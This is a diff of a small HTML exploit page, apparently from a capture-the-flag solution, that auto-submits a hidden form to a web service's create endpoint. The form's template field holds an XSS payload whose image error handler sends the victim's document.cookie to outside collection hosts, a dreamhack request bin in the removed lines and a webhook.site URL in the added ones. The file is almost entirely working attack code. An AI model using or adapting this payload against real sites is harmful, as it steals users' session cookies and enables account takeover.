@@ -2,9 +2,9 @@
 <html>
 <body>
 <h1>Loading...</h1>
-<form id="f" action="http://localhost:3000/create" method="POST">
+<form id="f" action="http://web:3000/create" method="POST">
     <input type="hidden" name="title" value="xss" />
-    <input type="hidden" name="template" value="<img src=x onerror='fetch(`https://loxvoxw.request.dreamhack.games?c=${document.cookie}`)'>" />
+    <input type="hidden" name="template" value="<img src=x onerror='new Image().src=`https://webhook.site/07887d14-7fe8-40bd-a5e0-1bd81bb6f542?c=${document.cookie}`'>" />
     <input type="hidden" name="answers" value="😃😃😃😃😃😃😃😃" />
 </form>
 <script>
